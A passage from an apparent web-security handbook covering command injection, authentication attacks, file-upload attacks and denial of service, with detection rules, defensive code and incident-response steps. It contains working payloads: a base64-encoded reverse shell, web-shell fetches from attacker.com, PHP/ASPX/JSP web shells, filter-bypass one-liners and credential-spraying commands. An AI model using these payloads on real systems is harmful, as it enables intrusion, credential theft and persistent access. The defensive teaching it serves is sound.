# File-write for later retrieval
curl "https://target.com/api/ping?host=8.8.8.8;id>/var/www/html/output.txt"
curl "https://target.com/output.txt"
```

### 12.5 Argument injection

Even when shell invocation is avoided (list-based APIs), the attacker can inject arguments to the target binary:

**Git argument injection:**
```bash
# Application runs: git clone <user-controlled-url>
# Attacker provides:
--upload-pack='touch /tmp/pwned' ssh://anything
# Via Git's ext:: transport:
ext::sh -c 'touch /tmp/pwned'%
# Via --config override:
-c core.sshCommand='touch /tmp/pwned' git@anything:repo
```

**ImageMagick (CVE-2016-3714 / ImageTragick):**
```
# Malicious MVG file:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
# Shell metacharacters passed to delegates (curl, wget)
```

**FFmpeg argument injection:**
```bash
# Malicious m3u8 playlist reads local files
concat:http://attacker.com/header.m3u8|file:///etc/passwd
# SSRF via FFmpeg protocols
ffmpeg -i "http://attacker.com/redirect?url=file:///etc/passwd" out.mp4
```

**cURL argument injection:**
```bash
# If user input becomes a cURL argument:
# Attacker: -o /var/www/html/shell.php http://attacker.com/shell.php
# Application runs: curl <user_input>
# Result: writes web shell to document root
```

### 12.6 Filter bypass techniques

```bash
# ${IFS} as space substitute (Internal Field Separator)
cat${IFS}/etc/passwd
{cat,/etc/passwd}

# Variable-based bypass (evade keyword filters)
a=c;b=at;$a$b /etc/passwd
w='wh';x='oam';y='i';$w$x$y

# Wildcard-based bypass
/???/??t /???/p??s??    # equivalent to: /bin/cat /etc/passwd

# Base64 encoding bypass
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDMgMD4mMQ== | base64 -d | bash

# Hex encoding bypass
echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

# Double-encoding for web contexts
%253B%2520id    # decoded twice -> ; id

# $'\x0a' as newline injection
ping$'\x0a'id

# Windows ^ escape for keyword evasion
wh^oami
po^wer^she^ll
```

### 12.7 Environment variable injection

```bash
# Shellshock (CVE-2014-6271)
curl -H "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" http://target.com/cgi-bin/script

# LD_PRELOAD injection (if attacker can set env vars)
LD_PRELOAD=/tmp/malicious.so /usr/bin/target_binary

# PATH manipulation
PATH=/tmp:$PATH target_command
# If /tmp/target_command is attacker-controlled -> executes attacker's binary
```

### 12.8 Language-specific vulnerable sinks

**Python:**
```python
# VULNERABLE — shell=True passes through /bin/sh
import os, subprocess
os.system(f"ping -c 1 {user_input}")                    # Direct shell execution
subprocess.call(f"ping -c 1 {user_input}", shell=True)  # shell=True is the problem
os.popen(f"nslookup {user_input}")                      # Returns file object with output
subprocess.Popen(f"dig {user_input}", shell=True)       # Same as call but async

# SAFE — argument list without shell=True
subprocess.run(["ping", "-c", "1", user_input], shell=False, capture_output=True)
# Each element is passed as a separate argv[] entry; metacharacters are not interpreted
```

**PHP:**
```php
// VULNERABLE — all of these invoke a shell
system("ping -c 1 " . $_GET['host']);
exec("ping -c 1 " . $_GET['host'], $output);
passthru("nslookup " . $_GET['host']);
shell_exec("dig " . $_GET['host']);
$result = `dig {$_GET['host']}`;              // backtick operator
popen("ping -c 1 " . $_GET['host'], "r");
proc_open("ping -c 1 " . $_GET['host'], ...);

// SAFE — escapeshellarg() wraps input in single quotes and escapes existing quotes
system("ping -c 1 " . escapeshellarg($_GET['host']));

// escapeshellcmd() escapes metacharacters but keeps the string as one argument
// It is weaker than escapeshellarg() — prefer escapeshellarg()
```

**Node.js:**
```javascript
// VULNERABLE — child_process.exec() uses /bin/sh
const { exec } = require('child_process');
exec(`ping -c 1 ${userInput}`, (err, stdout) => { /* ... */ });

// SAFE — execFile() does not invoke a shell
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', userInput], (err, stdout) => { /* ... */ });

// SAFE — spawn() with default options (no shell)
const { spawn } = require('child_process');
const proc = spawn('ping', ['-c', '1', userInput]);

// STILL VULNERABLE — spawn() with shell: true
spawn('ping', ['-c', '1', userInput], { shell: true });  // Defeats the purpose
```

**Java:**
```java
// VULNERABLE — single string passed to shell
Runtime.getRuntime().exec("ping -c 1 " + userInput);
// Note: Runtime.exec(String) splits on whitespace, which partially mitigates
// BUT Runtime.exec(String[]) with {"/bin/sh", "-c", "ping " + input} is fully vulnerable

// VULNERABLE — ProcessBuilder with shell invocation
new ProcessBuilder("/bin/sh", "-c", "ping -c 1 " + userInput).start();

// SAFE — argument list without shell
new ProcessBuilder("ping", "-c", "1", userInput).start();
// userInput is passed as a single argv element; shell metacharacters are inert
```

### 12.9 Detection

**Sigma rule — command injection indicators:**
```yaml
title: OS Command Injection Attempt in Web Parameters
id: 5c6d7e8f-9a0b-1c2d-3e4f-5a6b7c8d9e0f
status: stable
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - ';id'
      - '|whoami'
      - '`id`'
      - '$(id)'
      - '/etc/passwd'
      - 'cmd+/c'
      - 'powershell+'
      - 'nslookup+'
      - ';sleep+'
      - '&&curl+'
      - '%0a'
      - 'bash+-i'
      - '/dev/tcp/'
  condition: selection
  level: critical
  tags:
    - attack.execution
    - attack.t1059
```

**Process monitoring (Linux audit rules):**
```bash
# Detect shell spawned by web server process
auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep -f 'nginx|apache|node|python|java') -k webshell

# Sigma rule for process-level detection
# title: Shell Spawned by Web Server
# detection:
#   selection:
#     ParentImage|endswith:
#       - '/nginx'
#       - '/apache2'
#       - '/httpd'
#       - '/node'
#       - '/python'
#       - '/java'
#     Image|endswith:
#       - '/sh'
#       - '/bash'
#       - '/dash'
#       - '/zsh'
#       - '/cmd.exe'
#       - '/powershell.exe'
```

### 12.10 Defense

```python
# Python — comprehensive defense
import shlex, subprocess, re

# Option 1: Allowlist validation (best)
VALID_HOST = re.compile(r'^[a-zA-Z0-9\.\-]+$')
def safe_ping(host: str) -> str:
    if not VALID_HOST.match(host):
        raise ValueError("Invalid hostname")
    result = subprocess.run(
        ["ping", "-c", "1", "-W", "3", host],
        capture_output=True, text=True, timeout=10
    )
    return result.stdout

# Option 2: Use library functions instead of shell commands
import socket
def dns_lookup(hostname: str) -> str:
    # No shell involved — impossible to inject
    return socket.getaddrinfo(hostname, None)
```

### 12.11 Incident response

1. **Identify the injectable parameter** — correlate WAF alerts with web server access logs
2. **Determine executed commands** — check process audit logs (auditd, sysmon), bash history, /tmp for output files
3. **Assess lateral movement** — check for downloaded tools (wget, curl to attacker), new user accounts, SSH key additions, crontab modifications
4. **Check persistence** — webshells in document root, crontabs, systemd services, SSH authorized_keys
5. **Network forensics** — check for reverse shell connections, DNS tunneling, HTTP beaconing to C2

---

## 13. Authentication attacks

### 13.1 Credential stuffing

Automated replay of leaked username/password pairs against a target login endpoint. Uses credentials from previous breaches (Collections #1-5, Compilation of Many Breaches, etc.).

```bash
# Hydra — HTTP POST form brute-force
hydra -L usernames.txt -P passwords.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 16 -f -V

# Hydra — basic auth
hydra -L users.txt -P pass.txt target.com http-get /admin -t 10

# Hydra — SSH
hydra -L users.txt -P pass.txt ssh://target.com -t 4

# Burp Intruder — credential stuffing
# 1. Capture login request in Proxy
# 2. Send to Intruder, set Pitchfork attack type
# 3. Position 1: username field, Position 2: password field
# 4. Payload 1: usernames list, Payload 2: passwords list (1:1 mapping)
# 5. Add Grep-Match rule for successful login indicators
# 6. Throttle to avoid lockout (Resource Pool → max concurrent = 1, delay = 2000ms)

# ffuf — credential stuffing
ffuf -w usernames.txt:USER -w passwords.txt:PASS \
  -u https://target.com/api/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"USER","password":"PASS"}' \
  -mc 200 -mode pitchfork

# Detection of credential stuffing:
# - High volume of failed logins from distributed IPs
# - Login attempts with known breached credentials
# - User-agent diversity with same credential set
```

### 13.2 Password spraying

Test a small set of common passwords against many accounts. Avoids lockout thresholds by limiting attempts per account.

```bash
# Spray a single password across all accounts
# Hydra with reversed wordlists (1 password, many users)
hydra -L large_user_list.txt -p "Spring2026!" \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" \
  -t 1 -W 30  # 1 thread, 30 second wait between attempts

# Timing analysis — detect lockout threshold
# Try 3 attempts per account, wait lockout_period, repeat
for password in "Password1!" "Welcome1!" "Spring2026!"; do
  for user in $(cat users.txt); do
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/login \
      -d "username=$user&password=$password"
    sleep 1  # Rate limiting
  done
  sleep 1800  # Wait 30 minutes between password rounds
done

# Kerbrute — Active Directory password spraying
kerbrute passwordspray -d corp.local --dc 10.0.0.1 users.txt 'Spring2026!'

# Spray via Office 365 / Azure AD
# Tool: MSOLSpray, o365spray
python3 o365spray.py --spray -U users.txt -P passwords.txt \
  --domain target.com --rate 1 --safe 10
```

### 13.3 Session management attacks

**Session fixation:**
```bash
# Step 1: Attacker obtains a valid session ID from the target app
curl -c - https://target.com/login
# Returns: Set-Cookie: SESSIONID=attacker_chosen_value

# Step 2: Attacker forces victim to use this session ID
# Via URL: https://target.com/login?SESSIONID=attacker_chosen_value
# Via XSS: document.cookie = "SESSIONID=attacker_chosen_value"
# Via meta tag injection in HTML

# Step 3: Victim authenticates with the fixed session ID
# Step 4: Attacker uses the same session ID — now authenticated as victim

# Defense: regenerate session ID after authentication
# PHP:   session_regenerate_id(true);
# Java:  request.getSession().invalidate(); request.getSession(true);
# Django: request.session.cycle_key()
# Express: req.session.regenerate()
```

**Session prediction:**
```bash
# Collect multiple session tokens and analyze for patterns
for i in $(seq 1 100); do
  curl -s -c - https://target.com/login \
    -d "user=test&pass=test" | grep SESSIONID >> tokens.txt
done

# Burp Sequencer — statistical analysis of token randomness
# 1. Capture response with Set-Cookie in Proxy
# 2. Right-click → Send to Sequencer
# 3. Define the token location
# 4. Start live capture (need 10,000+ tokens)
# 5. Analyze: effective entropy, character-level analysis, bit-level analysis
# Good tokens: > 100 bits effective entropy
```

**Concurrent session abuse:**
```bash
# If app doesn't limit concurrent sessions:
# Attacker steals session token → both attacker and victim are logged in
# The victim logging out should invalidate ALL sessions (not just theirs)

# Server-side session tracking (Redis example):
# On login: store session → user mapping
# On password change/logout: invalidate ALL sessions for that user
```

### 13.4 OAuth2 attacks

**redirect_uri manipulation:**
```bash
# Open redirect via redirect_uri parameter pollution
# If validation checks prefix only:
https://auth.target.com/authorize?
  client_id=legit_app&
  redirect_uri=https://legit-app.com.attacker.com/callback&
  response_type=code&
  scope=openid

# Path traversal in redirect_uri
redirect_uri=https://legit-app.com/callback/../../../attacker.com

# Fragment-based bypass (authorization code in fragment)
redirect_uri=https://legit-app.com/callback%23@attacker.com

# Defense: exact-match redirect_uri validation, never prefix-match
```

**Scope escalation:**
```bash
# Request elevated scopes not authorized for the client
https://auth.target.com/authorize?
  client_id=mobile_app&
  redirect_uri=https://app.target.com/callback&
  response_type=code&
  scope=openid+profile+email+admin:write+billing:read

# Race condition in consent screen
# Submit consent for basic scope, simultaneously request token with elevated scope
```

**PKCE bypass:**
```bash
# PKCE (Proof Key for Code Exchange) prevents authorization code interception
# Attack: If server doesn't enforce PKCE, omit code_challenge entirely
curl -X POST https://auth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "redirect_uri=https://legit-app.com/callback" \
  -d "client_id=legit_app"
# If server doesn't require code_verifier → PKCE not enforced

# Defense: server MUST reject token requests without code_verifier
# when code_challenge was present in the authorization request
```

**Token theft via referer leakage:**
```bash
# If access_token is in URL fragment and page loads external resources:
# Referer: https://app.target.com/callback#access_token=eyJhbG...
# External resource (image, script) receives the token in Referer header
# Defense: use authorization code flow, not implicit flow (deprecated in OAuth 2.1)
```

### 13.5 SAML attacks

**Signature wrapping (XSW):**
```bash
# SAML assertions are signed XML documents
# XSW moves the original signed assertion to a non-processed location
# and inserts a forged assertion where the application reads it

# The signature validates against the original (unmoved) assertion
# but the application processes the forged one

# Tool: SAMLRaider (Burp extension)
# 1. Intercept SAML response in Burp
# 2. Send to SAMLRaider
# 3. Select XSW attack variant (XSW1-XSW8)
# 4. Modify the assertion (change NameID to admin)
# 5. Forward the modified response

# XSW1: Move signed assertion into SAML Extensions
# XSW2: Detach signature, clone assertion
# XSW3-8: Various wrapping positions
```

**Assertion replay:**
```bash
# Capture a valid SAML assertion and replay it later
# Works when:
# - No assertion ID tracking (replay detection)
# - No NotOnOrAfter enforcement (assertion expiry)
# - No Audience restriction validation

# Defense:
# - Track consumed assertion IDs in cache/database
# - Enforce NotOnOrAfter and NotBefore timestamps with clock skew tolerance
# - Validate Audience matches the relying party
# - Require InResponseTo matching the original AuthnRequest ID
```

**XXE in SAML:**
```xml
<!-- SAML responses are XML — vulnerable to XXE if parser doesn't disable DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
<!-- Apply same XXE defenses from §7.5 to all SAML XML parsing -->
```

### 13.6 Detection

```yaml
title: Credential Stuffing / Password Spraying Detection
id: 6d7e8f9a-0b1c-2d3e-4f5a-6b7c8d9e0f1a
status: stable
logsource:
  category: webserver
detection:
  # Credential stuffing: many failed logins from single IP
  selection_stuffing:
    cs-uri|contains: '/login'
    sc-status: 401
  filter_stuffing:
    | count(cs-uri) by src_ip > 50 within 5m
  # Password spraying: single password across many usernames
  selection_spraying:
    cs-uri|contains: '/login'
    sc-status: 401
  filter_spraying:
    | count(distinct cs-username) by cs-body-password > 20 within 30m
  condition: (selection_stuffing and filter_stuffing) or (selection_spraying and filter_spraying)
  level: high
  tags:
    - attack.credential_access
    - attack.t1110
```

### 13.7 Defense

```python
# Multi-factor defense stack
# 1. Rate limiting per IP and per account
# 2. Progressive delays after failed attempts
# 3. CAPTCHA after N failures
# 4. Account lockout with administrative unlock
# 5. Credential breach detection (check passwords against known breach databases)
# 6. MFA enforcement for sensitive operations

# Python (Flask) — progressive delay + breach check
import time, hashlib, requests
from functools import wraps

FAILED_ATTEMPTS = {}  # In production: use Redis

def login_rate_limit(f):
    @wraps(f)
    def decorated(username, password, *args, **kwargs):
        key = f"login:{username}"
        attempts = FAILED_ATTEMPTS.get(key, 0)
        if attempts >= 5:
            delay = min(2 ** (attempts - 5), 300)  # Exponential backoff, max 5 min
            time.sleep(delay)
        if attempts >= 10:
            return {"error": "Account locked. Contact admin."}, 423
        return f(username, password, *args, **kwargs)
    return decorated

def check_breached_password(password: str) -> bool:
    """Check password against Have I Been Pwned API (k-anonymity model)."""
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    resp = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
    return suffix in resp.text
```

---

## 14. File upload attacks

### 14.1 Extension bypass techniques

Web applications often filter uploads by file extension, but these checks are frequently bypassable.

| Bypass Technique | Example | Target |
|---|---|---|
| Double extension | `shell.php.jpg` | Apps that check only the last extension |
| Null byte (legacy) | `shell.php%00.jpg` | PHP < 5.3.4, old Java |
| Case manipulation | `shell.pHp`, `shell.PHP5` | Case-sensitive blocklists |
| Alternative extensions | `.phtml`, `.phar`, `.php5`, `.php7`, `.phps` | PHP |
| Alternative extensions | `.asp`, `.aspx`, `.ashx`, `.asmx`, `.cer` | ASP.NET/IIS |
| Alternative extensions | `.jsp`, `.jspx`, `.jsw`, `.jsv` | Java |
| Content-type mismatch | Upload `.php` with `Content-Type: image/jpeg` | Apps checking only MIME type |
| Trailing dot/space | `shell.php.`, `shell.php ` (Windows) | Windows filesystem normalization |
| NTFS alternate data stream | `shell.php::$DATA` (Windows) | IIS |
| Path traversal in filename | `../../../var/www/html/shell.php` | Apps that don't sanitize filenames |
| .htaccess upload | Upload `.htaccess` to make `.txt` execute as PHP | Apache mod_php |

```bash
# Upload .htaccess to enable PHP execution for .txt files
echo 'AddType application/x-httpd-php .txt' > .htaccess
curl -F "file=@.htaccess" https://target.com/upload

# Then upload shell.txt (PHP code inside)
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
curl -F "file=@shell.txt" https://target.com/upload
curl "https://target.com/uploads/shell.txt?cmd=id"

# web.config upload for IIS (execute .txt as ASP)
# Upload web.config with handler mapping for .txt → ASP.NET
```

### 14.2 Web shell deployment

```php
// PHP — minimal web shell (one-liner)
<?php system($_GET['cmd']); ?>

// PHP — stealthier with POST and base64
<?php eval(base64_decode($_POST['c'])); ?>

// PHP — bypass disable_functions via mail() + putenv() (CVE-2016-2858 chain)
<?php
putenv('LD_PRELOAD=/tmp/evil.so');
mail('','','','');
?>
```

```aspx
<!-- ASPX web shell -->
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

```jsp
<!-- JSP web shell -->
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
out.println(s.hasNext() ? s.next() : "");
%>
```

```bash
# Web shell detection — filesystem indicators
find /var/www -name "*.php" -newer /var/www/index.php -mtime -7
find /var/www -name "*.php" -exec grep -l "system\|exec\|passthru\|shell_exec\|eval\|base64_decode" {} \;
find /var/www -name "*.php" -size -1k  # Small files are suspicious

# YARA rule for PHP web shells
```

```yara
rule PHP_Webshell {
    meta:
        description = "Detect common PHP web shell patterns"
    strings:
        $exec1 = "system($_" ascii
        $exec2 = "exec($_" ascii
        $exec3 = "passthru($_" ascii
        $exec4 = "shell_exec($_" ascii
        $eval1 = "eval(base64_decode(" ascii
        $eval2 = "eval(gzinflate(" ascii
        $eval3 = "eval(str_rot13(" ascii
        $eval4 = "assert($_" ascii
        $obf1 = "chr(99).chr(104).chr(114)" ascii
        $obf2 = "\\x73\\x79\\x73\\x74\\x65\\x6d" ascii
    condition:
        any of them
}
```

### 14.3 Polyglot files

Files that are simultaneously valid in two formats. Used to bypass content validation that checks magic bytes.

**GIFAR (GIF + JAR):**
```bash
# A file that is both a valid GIF image and a valid JAR (Java archive)
# GIF header: GIF89a at offset 0
# JAR (ZIP) structure: appended after GIF data
# The GIF parser reads the image; the Java classloader reads the JAR

# Create GIFAR
cat image.gif payload.jar > gifar.gif
# If uploaded as .gif and served from the app's domain,
# Java applet can execute in the context of that domain (historical, patched in JDK 6u11)
```

**Image + PHP polyglot:**
```bash
# Inject PHP code into image EXIF/comment data
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg

# Or create minimal valid JPEG with PHP
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>\xff\xd9' > poly.php.jpg

# PNG polyglot — PHP in tEXt chunk
# Use pngcheck to verify valid PNG structure after injection
```

**SVG + JavaScript:**
```xml
<!-- SVG files can contain JavaScript — dangerous when served inline -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <circle cx="50" cy="50" r="40" />
</svg>
<!-- If uploaded and served with Content-Type: image/svg+xml
     from the app's domain → XSS via SVG -->
```

### 14.4 Detection

**Sigma rule — web shell upload indicators:**
```yaml
title: Suspicious File Upload - Potential Web Shell
id: 7e8f9a0b-1c2d-3e4f-5a6b-7c8d9e0f1a2b
status: stable
logsource:
  category: webserver
detection:
  selection_extension:
    cs-uri|contains: '/upload'
    cs-body|re: '\.(php|phtml|phar|php5|php7|asp|aspx|ashx|jsp|jspx|war)\b'
  selection_content:
    cs-body|contains:
      - 'system('
      - 'exec('
      - 'eval('
      - 'passthru('
      - 'Runtime.getRuntime'
      - 'ProcessBuilder'
      - 'child_process'
  condition: selection_extension or selection_content
  level: critical
  tags:
    - attack.persistence
    - attack.t1505.003
```

**ModSecurity rules for upload protection:**

| Rule ID | Description |
|---|---|
| 933100 | PHP injection attack: PHP open tag found |
| 933110 | PHP injection attack: PHP script file upload |
| 933120 | PHP injection attack: PHP configuration directive |
| 933150 | PHP injection attack: high-risk PHP function name |
| 933160 | PHP injection attack: high-risk PHP function call |

### 14.5 Defense

```python
# Python (Flask) — comprehensive upload defense
import os, uuid, magic, subprocess
from PIL import Image
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}
ALLOWED_MIMETYPES = {'image/png', 'image/jpeg', 'image/gif', 'application/pdf'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
UPLOAD_DIR = '/var/uploads'  # Outside document root

def validate_upload(file):
    # 1. Check extension (allowlist)
    ext = file.filename.rsplit('.', 1)[-1].lower() if '.' in file.filename else ''
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension '{ext}' not allowed")

    # 2. Check content type via magic bytes (not the Content-Type header)
    file_bytes = file.read(8192)
    file.seek(0)
    detected_mime = magic.from_buffer(file_bytes, mime=True)
    if detected_mime not in ALLOWED_MIMETYPES:
        raise ValueError(f"Content type '{detected_mime}' not allowed")

    # 3. Re-encode images to strip embedded code
    if detected_mime.startswith('image/'):
        img = Image.open(file)
        clean_path = os.path.join(UPLOAD_DIR, f"{uuid.uuid4()}.{ext}")
        img.save(clean_path)
        return clean_path

    # 4. Generate random filename (prevent path traversal, extension manipulation)
    safe_name = f"{uuid.uuid4()}.{ext}"
    dest = os.path.join(UPLOAD_DIR, safe_name)
    file.save(dest)

    # 5. Virus scan
    result = subprocess.run(
        ['clamscan', '--no-summary', dest],
        capture_output=True, text=True, timeout=30
    )
    if result.returncode != 0:
        os.remove(dest)
        raise ValueError("Malware detected")

    return dest
```

**Infrastructure-level defense:**
```nginx
# Nginx — serve uploads from a separate domain (prevents cookie access)
server {
    server_name uploads.target-cdn.com;
    root /var/uploads;

    # Disable script execution
    location ~ \.(php|phtml|php5|asp|aspx|jsp|py|pl|cgi|sh)$ {
        deny all;
    }

    # Force download instead of rendering
    location / {
        add_header Content-Disposition "attachment";
        add_header X-Content-Type-Options "nosniff";
        add_header Content-Security-Policy "default-src 'none'";
    }
}
```

```apache
# Apache — disable PHP execution in upload directory
<Directory "/var/www/uploads">
    php_admin_flag engine Off
    RemoveHandler .php .phtml .php5 .php7 .phar
    RemoveType .php .phtml .php5 .php7 .phar
    <FilesMatch "\.(php|phtml|php5|php7|phar)$">
        Require all denied
    </FilesMatch>
</Directory>
```

### 14.6 Incident response

1. **Identify uploaded web shells** — scan upload directories with YARA rules, file integrity monitoring alerts
2. **Determine access** — search web logs for requests to uploaded files with query parameters (e.g., `?cmd=`)
3. **Timeline reconstruction** — correlate upload timestamp with command execution logs, process creation events
4. **Check lateral movement** — review commands executed via web shell (typically: whoami, ifconfig, cat /etc/passwd, download additional tools)
5. **Remove and block** — delete web shells, add file integrity rules, restrict upload directory permissions, disable script execution in upload directories
6. **Patch** — implement content validation, re-encoding, and filename randomization

---

## 15. Comprehensive detection and hardening

### 15.1 WAF rule effectiveness matrix

| Attack Category | ModSecurity CRS PL1 | PL2 | PL3 | PL4 | Bypass Difficulty |
|---|---|---|---|---|---|
| SQLi UNION | Detected | Detected | Detected | Detected | Moderate (tampers) |
| SQLi blind | Partial | Detected | Detected | Detected | High |
| XSS reflected | Detected | Detected | Detected | Detected | Moderate |
| SSRF | Not detected | Partial | Partial | Partial | Low (encoding) |
| SSTI | Not detected | Partial | Partial | Detected | High |
| Deserialization | Not detected | Not detected | Partial | Partial | Low |
| XXE | Partial | Detected | Detected | Detected | Moderate |
| Smuggling | N/A (infra) | N/A | N/A | N/A | Varies by stack |

### 15.2 Security testing tool comparison

| Tool | Type | Best For | License |
|---|---|---|---|
| sqlmap | CLI | SQL injection | GPL |
| Burp Suite Pro | GUI | All web attacks | Commercial |
| nuclei | CLI | Template-based scanning | MIT |
| ffuf | CLI | Fuzzing/discovery | MIT |
| Nikto | CLI | Web server misconfiguration | GPL |
| wfuzz | CLI | Parameter fuzzing | GPL |
| Arjun | CLI | Hidden parameter discovery | MIT |
| ParamSpider | CLI | Parameter enumeration | MIT |
| jwt_tool | CLI | JWT attacks | MIT |
| GraphQLmap | CLI | GraphQL exploitation | MIT |

### 15.3 Incident response — server-side attack playbook

1. **Triage** — classify the attack type from WAF/application logs
2. **Contain** — block the source IP/range at the WAF/firewall level; if data exfiltration confirmed, isolate the database
3. **Investigate** — correlate web logs with database audit logs, outbound connection logs, and DNS logs
4. **Assess damage** — determine if data was read (SELECT-based SQLi), modified (UPDATE/DELETE/stacked), or if system commands were executed (xp_cmdshell, os.system via SSTI/deserialization)
5. **Remediate** — patch the vulnerable code, deploy WAF rules as interim protection, rotate exposed credentials
6. **Harden** — implement parameterized queries, input validation, allowlisting; enable database auditing; restrict database user privileges
7. **Report** — document the attack timeline, affected data, remediation steps; trigger breach notification if PII was compromised

---

## 16. Rate limiting, DoS, and algorithmic complexity attacks

### 16.1 ReDoS (Regular Expression Denial of Service)

**Mechanism.** Certain regex patterns exhibit catastrophic backtracking when matched against crafted input. Patterns with nested quantifiers or overlapping alternations cause exponential time complexity.

Vulnerable patterns:
```
^(a+)+$                    matched against "aaaaaaaaaaaaaaaaaaaaaaaa!"
^([a-zA-Z0-9]+)*$          matched against "aaaaaaaaaaaaaaaaaaaaaa!"
(a|a)*$                    matched against "aaaaaaaaaaaaaaaaaaaaaaaa!"
(.*a){20}                  matched against "aaaaaaaaaaaaaaaaaaaaaa!"
^(([a-z])+.)+[A-Z]{2,}$    email-like pattern: exponential on crafted input
```

**Exploitation.** A 25-character input can cause the regex engine to take minutes:
```python
import re, time
pattern = re.compile(r'^(a+)+$')
for length in range(20, 30):
    payload = 'a' * length + '!'
    start = time.time()
    pattern.match(payload)
    elapsed = time.time() - start
    print(f"Length {length}: {elapsed:.3f}s")
# Length 20: 0.05s, Length 25: 1.6s, Length 28: 12.8s, Length 30: 51.2s
```

**Detection.**
```bash
# Static analysis for ReDoS-vulnerable patterns
npx recheck "^(a+)+$"       # recheck
npx safe-regex "^(a+)+$"    # safe-regex
```

**Hardening.**
- Use RE2-compatible engines (linear-time, no backtracking): Google RE2, `re2` Python package, Go `regexp` (RE2 by default).
- Set regex evaluation timeouts: `regex.match(pattern, input, timeout=1)` (Python `regex` module).
- Avoid nested quantifiers and overlapping alternations.
- Validate input length before applying regex.

### 16.2 Quadratic blowup variant (XML)

In addition to the billion-laughs exponential attack (section 7.4), a quadratic blowup variant repeats a single large entity many times:
```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAA... (50,000 chars)">
]>
<data>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</data>
<!-- 20 references x 50KB = 1MB from a 50KB payload; scales arbitrarily -->
```

**Hardening.** Disable DTD processing (section 7.5). Java: `XMLConstants.FEATURE_SECURE_PROCESSING = true` limits entity expansion to 64,000.

### 16.3 Hash collision DoS

**Mechanism.** When a hash table's hash function is predictable, an attacker crafts inputs that all hash to the same bucket, degrading O(1) lookups to O(n) -- turning hash table operations into O(n^2) for n insertions.

**Affected.** PHP (<5.4), Python (pre-3.3 before `PYTHONHASHSEED`), Java (before HashMap's red-black tree fallback in Java 8), Ruby.

**Exploitation.** 65K POST parameters with colliding hash values = seconds of CPU per request = DoS with few concurrent requests.

**Hardening.**
- Modern runtimes use randomized hash seeds by default. Ensure `PYTHONHASHSEED=random` (default since Python 3.3).
- Limit POST parameter count: PHP `max_input_vars = 1000`, Node.js `express.urlencoded({ parameterLimit: 1000 })`.
- Java 8+: HashMap uses balanced tree for buckets >8 entries (O(log n) worst case).

### 16.4 Slowloris

**Mechanism.** The attacker opens many connections but sends HTTP headers very slowly (one byte per timeout window), exhausting the server's connection pool. Thread-per-connection servers (Apache prefork) are most vulnerable.

**Hardening.**
```nginx
# Nginx: aggressive timeouts
client_header_timeout 10s;
client_body_timeout 10s;
keepalive_timeout 15s;
send_timeout 10s;

# Limit concurrent connections per IP
limit_conn_zone $binary_remote_addr zone=addr:10m;
limit_conn addr 10;
```

- Use event-driven servers (NGINX, Node.js) instead of thread-per-connection (Apache prefork).
- Deploy a reverse proxy or CDN in front of the application server.

### 16.5 API rate limiting implementations

**Token bucket with Redis:**
```python
import redis, time

r = redis.Redis()

def is_rate_limited(client_id: str, max_tokens: int = 100, refill_rate: float = 10) -> bool:
    key = f"ratelimit:{client_id}"
    now = time.time()
    pipe = r.pipeline()
    pipe.hgetall(key)
    result = pipe.execute()
    bucket = result[0]

    tokens = float(bucket.get(b'tokens', max_tokens))
    last_refill = float(bucket.get(b'last', now))
    elapsed = now - last_refill
    tokens = min(max_tokens, tokens + elapsed * refill_rate)

    if tokens < 1:
        return True  # Rate limited
    pipe = r.pipeline()
    pipe.hset(key, mapping={'tokens': str(tokens - 1), 'last': str(now)})
    pipe.expire(key, 60)
    pipe.execute()
    return False
```

**Sliding window with Redis sorted sets:**
```bash
# Redis commands for sliding window rate limiter
MULTI
ZREMRANGEBYSCORE ratelimit:client1 0 <current_time - 60>
ZADD ratelimit:client1 <current_time> <unique_request_id>
ZCARD ratelimit:client1
EXPIRE ratelimit:client1 60
EXEC
# If ZCARD result > max_requests -> reject (HTTP 429)
```

